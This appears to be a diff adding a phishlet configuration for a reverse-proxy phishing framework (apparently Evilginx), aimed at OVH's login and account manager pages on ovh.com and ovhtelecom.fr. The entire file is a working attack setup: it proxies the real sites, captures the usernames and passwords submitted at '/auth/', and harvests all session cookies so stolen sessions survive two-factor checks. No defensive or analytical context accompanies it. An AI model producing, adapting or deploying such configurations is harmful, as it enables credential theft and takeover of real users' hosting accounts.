@@ -1,0 +1,26 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'ovh.com', session: true, is_landing: true}
+  - {phish_sub: 'eu.api', orig_sub: 'eu.api', domain: 'ovh.com'}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'ovhtelecom.fr'}
+  - {phish_sub: 'msgstore.www', orig_sub: 'msgstore.www', domain: 'ovh.com'}
+sub_filters:
+  - {triggers_on: 'www.ovh.com', orig_sub: 'www', domain: 'ovh.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: 'www.ovh.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/__crosslogin/.*'
+  - '/manager/.*'
+credentials:
+  username:
+    key: '0dcebe5f'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '4f6b9838'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.ovh.com'
+  path: '/auth/'
